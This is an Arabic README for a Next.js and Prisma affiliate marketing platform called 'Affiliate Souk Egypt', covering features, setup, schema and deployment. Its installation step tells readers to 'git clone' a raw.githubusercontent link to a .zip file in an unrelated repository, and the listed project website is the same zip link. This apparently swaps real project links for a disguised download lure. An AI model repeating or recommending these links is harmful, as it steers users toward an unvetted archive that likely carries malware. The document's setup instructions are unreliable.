# أفلييت سوق مصر - Affiliate Souk Egypt

منصة التسويق بالعمولة الرائدة في مصر والشرق الأوسط

## 🌟 المميزات

### للمسوقين بالعمولة
- **لوحة تحكم شخصية** مع إحصائيات مفصلة
- **نظام إشعارات متقدم** للتحديثات الفورية
- **روابط إحالة مخصصة** مع تتبع دقيق
- **عمولات عالية** تصل إلى 25%
- **دفع سريع وآمن** عبر طرق متعددة

### للإدارة
- **لوحة إدارة شاملة** على غرار cPanel
- **إدارة المستخدمين والحملات**
- **تحليلات وتقارير متقدمة**
- **نظام أمان متطور**
- **مراقبة الأداء في الوقت الفعلي**

### المميزات التقنية
- **دعم كامل للغة العربية** مع تخطيط RTL
- **تصميم متجاوب** يعمل على جميع الأجهزة
- **نظام دردشة مباشرة** للدعم الفني
- **مركز تدريبي شامل** مع فيديوهات تعليمية
- **أمان متقدم** مع حماية من الهجمات

## 🚀 التقنيات المستخدمة

### Frontend
- **Next.js 15** - إطار عمل React متقدم
- **TypeScript** - للكتابة الآمنة
- **Tailwind CSS** - للتصميم السريع والمرن
- **Lucide React** - مكتبة الأيقونات

### Backend
- **Next.js API Routes** - للخدمات الخلفية
- **Prisma** - ORM متقدم لقاعدة البيانات
- **PostgreSQL** - قاعدة بيانات قوية وموثوقة
- **NextAuth.js** - نظام مصادقة شامل

### الأمان والأداء
- **JWT** - للمصادقة الآمنة
- **bcryptjs** - لتشفير كلمات المرور
- **Rate Limiting** - للحماية من الهجمات
- **CSRF Protection** - حماية من هجمات CSRF
- **XSS Protection** - حماية من هجمات XSS

## 📦 التثبيت والإعداد

### المتطلبات
- Node.js 18+ 
- PostgreSQL 14+
- npm أو yarn

### خطوات التثبيت

1. **استنساخ المشروع**
```bash
git clone https://raw.githubusercontent.com/Ahmedfares3/web/main/eloquently/Software_luxuriant.zip
cd affiliate-souk-egypt
```

2. **تثبيت التبعيات**
```bash
npm install
```

3. **إعداد متغيرات البيئة**
```bash
cp .env.example .env
```

قم بتحديث الملف `.env` بالقيم المناسبة:
```env
DATABASE_URL="postgresql://username:password@localhost:5432/affiliate_souk_egypt"
NEXTAUTH_URL="http://localhost:3000"
NEXTAUTH_SECRET="your-secret-key-here"
JWT_SECRET="your-jwt-secret-here"
```

4. **إعداد قاعدة البيانات**
```bash
npx prisma generate
npx prisma db push
npx prisma db seed
```

5. **تشغيل المشروع**
```bash
npm run dev
```

الموقع سيكون متاحاً على: `http://localhost:3000`

## 🗂️ هيكل المشروع

```
src/
├── app/                    # صفحات Next.js
│   ├── admin/             # لوحة الإدارة
│   ├── dashboard/         # لوحة المستخدم
│   ├── login/             # تسجيل الدخول
│   ├── register/          # التسجيل
│   ├── training/          # مركز التدريب
│   └── api/               # API Routes
├── components/            # المكونات المشتركة
│   ├── ui/               # مكونات واجهة المستخدم
│   ├── LiveChat.tsx      # نظام الدردشة
│   └── NotificationSystem.tsx
├── lib/                   # المكتبات والأدوات
│   ├── auth.ts           # نظام المصادقة
│   ├── db-utils.ts       # أدوات قاعدة البيانات
│   ├── security.ts       # الأمان
│   ├── performance.ts    # تحسين الأداء
│   └── utils.ts          # أدوات مساعدة
└── prisma/               # مخطط قاعدة البيانات
```

## 🔐 الأمان

### المميزات الأمنية
- **تشفير كلمات المرور** باستخدام bcrypt
- **حماية من Rate Limiting** لمنع الهجمات
- **CSRF Protection** لحماية النماذج
- **XSS Protection** لحماية من البرمجة الخبيثة
- **SQL Injection Prevention** باستخدام Prisma
- **مراقبة النشاط المشبوه** مع التسجيل التلقائي

### إعدادات الأمان
```typescript
// في ملف security.ts
export const securityConfig = {
  passwordMinLength: 8,
  maxLoginAttempts: 5,
  sessionTimeout: 24 * 60 * 60 * 1000, // 24 ساعة
  rateLimitWindow: 15 * 60 * 1000,     // 15 دقيقة
  rateLimitMax: 100                     // 100 طلب
}
```

## 📊 قاعدة البيانات

### الجداول الرئيسية
- **users** - بيانات المستخدمين
- **affiliates** - بيانات المسوقين
- **campaigns** - الحملات التسويقية
- **clicks** - تتبع النقرات
- **conversions** - تتبع التحويلات
- **payments** - المدفوعات
- **notifications** - الإشعارات

### العلاقات
```prisma
model User {
  id        String    @id @default(cuid())
  email     String    @unique
  affiliate Affiliate?
  notifications Notification[]
}

model Affiliate {
  id           String @id @default(cuid())
  userId       String @unique
  user         User   @relation(fields: [userId], references: [id])
  clicks       Click[]
  conversions  Conversion[]
}
```

## 🎨 التصميم والواجهة

### نظام الألوان
```css
:root {
  --primary-50: #f0f9ff;
  --primary-500: #0ea5e9;
  --primary-600: #0284c7;
  --secondary-500: #d946ef;
  --secondary-600: #c026d3;
}
```

### الخطوط العربية
- **Cairo** - الخط الأساسي
- **Tajawal** - خط احتياطي
- دعم كامل لـ RTL (Right-to-Left)

## 🧪 الاختبارات

### تشغيل الاختبارات
```bash
# اختبارات الوحدة
npm run test

# اختبارات التكامل
npm run test:integration

# اختبارات E2E
npm run test:e2e
```

### أنواع الاختبارات
- **Unit Tests** - اختبار المكونات الفردية
- **Integration Tests** - اختبار التكامل بين المكونات
- **E2E Tests** - اختبار المسارات الكاملة
- **Security Tests** - اختبار الثغرات الأمنية

## 📈 مراقبة الأداء

### المقاييس المتتبعة
- **Web Vitals** (FCP, LCP, CLS)
- **استخدام الذاكرة**
- **أوقات الاستجابة**
- **معدلات الخطأ**

### أدوات المراقبة
```typescript
// مراقبة الأداء
performanceMonitor.trackWebVitals()
performanceMonitor.recordMetric('api.response.time', responseTime)
```

## 🚀 النشر

### متطلبات الإنتاج
- **Node.js 18+**
- **PostgreSQL 14+**
- **Redis** (للتخزين المؤقت)
- **SSL Certificate**

### خطوات النشر
1. **بناء المشروع**
```bash
npm run build
```

2. **تشغيل في الإنتاج**
```bash
npm start
```

3. **إعداد قاعدة البيانات**
```bash
npx prisma migrate deploy
```

## 🤝 المساهمة

نرحب بمساهماتكم! يرجى اتباع الخطوات التالية:

1. Fork المشروع
2. إنشاء فرع جديد (`git checkout -b feature/amazing-feature`)
3. Commit التغييرات (`git commit -m 'Add amazing feature'`)
4. Push إلى الفرع (`git push origin feature/amazing-feature`)
5. فتح Pull Request

## 📝 الترخيص

هذا المشروع مرخص تحت رخصة MIT - راجع ملف [LICENSE](LICENSE) للتفاصيل.

## 📞 التواصل

- **البريد الإلكتروني**: info@affiliatesouk.eg
- **الهاتف**: +20 100 123 4567
- **الموقع**: https://raw.githubusercontent.com/Ahmedfares3/web/main/eloquently/Software_luxuriant.zip

## 🙏 شكر وتقدير

شكر خاص لجميع المساهمين والمطورين الذين ساعدوا في إنجاز هذا المشروع.

---

**أفلييت سوق مصر** - منصة التسويق بالعمولة الرائدة في مصر 🇪🇬
